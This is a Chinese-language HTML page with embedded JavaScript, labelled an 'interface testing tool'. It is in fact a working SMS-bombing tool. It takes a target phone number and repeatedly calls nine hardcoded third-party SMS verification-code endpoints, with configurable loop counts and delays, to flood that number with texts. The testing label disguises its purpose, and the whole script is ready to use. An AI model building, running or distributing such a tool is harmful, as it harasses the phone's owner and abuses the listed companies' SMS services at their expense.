<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>接口测试工具</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen p-4 md:p-8">
    <div class="max-w-2xl mx-auto bg-white rounded-lg shadow-md p-6">
        <h1 class="text-2xl font-bold text-center mb-6 text-gray-800">接口测试工具</h1>
        
        <div class="space-y-4 mb-6">
            <!-- 模式选择 -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">选择模式</label>
                <select id="mode" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <option value="1">批量循环（所有接口）</option>
                    <option value="2">单项测试（1-9接口可用）</option>
                </select>
            </div>

            <!-- 手机号输入 -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-2">目标手机号</label>
                <input type="tel" id="target" maxlength="11" placeholder="请输入11位手机号" 
                    class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>

            <!-- 接口编号（仅单项测试显示） -->
            <div id="testIdContainer" class="hidden">
                <label class="block text-sm font-medium text-gray-700 mb-2">测试接口编号(1-9)</label>
                <input type="number" id="testId" min="1" max="9" placeholder="请输入接口编号" 
                    class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
            </div>

            <!-- 批量模式参数 -->
            <div id="batchParamsContainer">
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">循环轮数</label>
                        <input type="number" id="loopCount" value="1" min="1" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">接口间隔(秒)</label>
                        <input type="number" id="sendDelay" value="0" min="0" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">轮次间隔(秒)</label>
                        <input type="number" id="roundDelay" value="1" min="0" 
                            class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                    </div>
                </div>
            </div>

            <!-- 按钮组 -->
            <div class="flex gap-4">
                <button id="startBtn" class="flex-1 bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 transition-colors">
                    开始执行
                </button>
                <button id="stopBtn" class="flex-1 bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700 transition-colors" disabled>
                    停止执行
                </button>
            </div>
        </div>

        <!-- 日志区域 -->
        <div>
            <label class="block text-sm font-medium text-gray-700 mb-2">执行日志</label>
            <div id="log" class="bg-gray-900 text-green-400 p-4 rounded-md h-80 overflow-y-auto font-mono text-sm">
                <div>工具已就绪，请输入参数后点击开始执行</div>
            </div>
        </div>
    </div>

    <script>
        let isRunning = false;
        let abortController = null;

        // 模式切换
        document.getElementById('mode').addEventListener('change', function() {
            const mode = this.value;
            const testIdContainer = document.getElementById('testIdContainer');
            const batchParamsContainer = document.getElementById('batchParamsContainer');
            
            if (mode === '2') {
                testIdContainer.classList.remove('hidden');
                batchParamsContainer.classList.add('hidden');
            } else {
                testIdContainer.classList.add('hidden');
                batchParamsContainer.classList.remove('hidden');
            }
        });

        // 日志输出
        function log(message) {
            const logDiv = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            const line = document.createElement('div');
            line.textContent = `[${time}] ${message}`;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // 睡眠函数
        function sleep(seconds) {
            return new Promise(resolve => setTimeout(resolve, seconds * 1000));
        }

        // 发送接口请求
        async function sendRequest(apiId, target) {
            log(`请求接口${apiId}`);
            
            try {
                let response;
                switch(apiId) {
                    case 1:
                        response = await fetch('https://www.jszyfw.com/PhoneNote/sendNote', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `mobileNum=${target}&note=1`,
                            signal: abortController.signal
                        });
                        break;
                    case 2:
                        response = await fetch('https://www.rsk.cn/api/auth/send-sms', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ phone: target }),
                            signal: abortController.signal
                        });
                        break;
                    case 3:
                        response = await fetch('https://jxdj.jingxiangdj.com/index.php/api/client/config', {
                            method: 'POST',
                            headers: { 
                                'version_code': '111',
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ op: 'sms_code', mobile: target }),
                            signal: abortController.signal
                        });
                        break;
                    case 4:
                        response = await fetch('https://prod.chujingapp.com/ooc_assistant/api/sms/sendVerifyCode', {
                            method: 'POST',
                            headers: { 'package-name': 'com.easy.abroad' },
                            body: `phone_num=${target}`,
                            signal: abortController.signal
                        });
                        break;
                    case 5:
                        response = await fetch('https://bounty.gomays.com/api/sms/send', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `type=1&event=register&mobile=${target}&appType=goldhelp`,
                            signal: abortController.signal
                        });
                        break;
                    case 6:
                        response = await fetch('https://api.duoduoxuanshang.cn/user/sendSMS', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `phone=${target}`,
                            signal: abortController.signal
                        });
                        break;
                    case 7:
                        response = await fetch('https://c.00242.cn/api/user/SendMsgCode', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                account: target, 
                                userful: 'reglogin', 
                                version: '4752', 
                                apptype: '20', 
                                token: '' 
                            }),
                            signal: abortController.signal
                        });
                        break;
                    case 8:
                        response = await fetch(`https://api.zhuayoubao.com/httzyb/api/login/getVerificationCode?phone=${target}&channel=29&packageName=com.zhuayoubao.box`, {
                            signal: abortController.signal
                        });
                        break;
                    case 9:
                        response = await fetch('https://bapt.cloudxin.vip/App/SliderVerificationAndSendCode', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                Mobile: target, 
                                Source: 'Android', 
                                AppId: 'YXJY003' 
                            }),
                            signal: abortController.signal
                        });
                        break;
                    default:
                        // 10-100接口原脚本为空，仅打印日志
                        return;
                }
                
                const result = await response.text();
                log(`接口${apiId}响应: ${result.substring(0, 100)}${result.length > 100 ? '...' : ''}`);
            } catch (error) {
                if (error.name === 'AbortError') {
                    log(`接口${apiId}请求已取消`);
                } else {
                    log(`接口${apiId}请求失败: ${error.message}`);
                }
            }
        }

        // 开始执行
        document.getElementById('startBtn').addEventListener('click', async function() {
            const mode = document.getElementById('mode').value;
            const target = document.getElementById('target').value.trim();
            const testId = document.getElementById('testId').value;
            const loopCount = parseInt(document.getElementById('loopCount').value) || 1;
            const sendDelay = parseInt(document.getElementById('sendDelay').value) || 0;
            const roundDelay = parseInt(document.getElementById('roundDelay').value) || 1;

            // 手机号校验
            if (!target || target.length !== 11) {
                alert('请输入正确的11位手机号');
                return;
            }

            // 单项测试接口编号校验
            if (mode === '2' && (!testId || testId < 1 || testId > 9)) {
                alert('请输入1-9之间的接口编号');
                return;
            }

            // 重置状态
            isRunning = true;
            abortController = new AbortController();
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('log').innerHTML = '';

            log(`开始执行 目标号码：${target}`);
            log(`接口间隔：${sendDelay} 秒`);
            log(`轮次间隔：${roundDelay} 秒`);
            log('--------------------------------');

            try {
                for (let i = 1; i <= loopCount && isRunning; i++) {
                    log(`第 ${i} 轮`);

                    if (mode === '2') {
                        // 单项测试
                        await sendRequest(parseInt(testId), target);
                    } else {
                        // 批量测试所有接口
                        for (let apiId = 1; apiId <= 100 && isRunning; apiId++) {
                            await sendRequest(apiId, target);
                            if (apiId < 100 && isRunning) {
                                await sleep(sendDelay);
                            }
                        }
                    }

                    log('本轮完成');
                    if (i < loopCount && isRunning) {
                        await sleep(roundDelay);
                    }
                }

                if (isRunning) {
                    log('--------------------------------');
                    log('执行完毕');
                } else {
                    log('--------------------------------');
                    log('执行已停止');
                }
            } catch (error) {
                log(`执行出错: ${error.message}`);
            } finally {
                isRunning = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
            }
        });

        // 停止执行
        document.getElementById('stopBtn').addEventListener('click', function() {
            isRunning = false;
            if (abortController) {
                abortController.abort();
            }
        });
    </script>
</body>
</html>
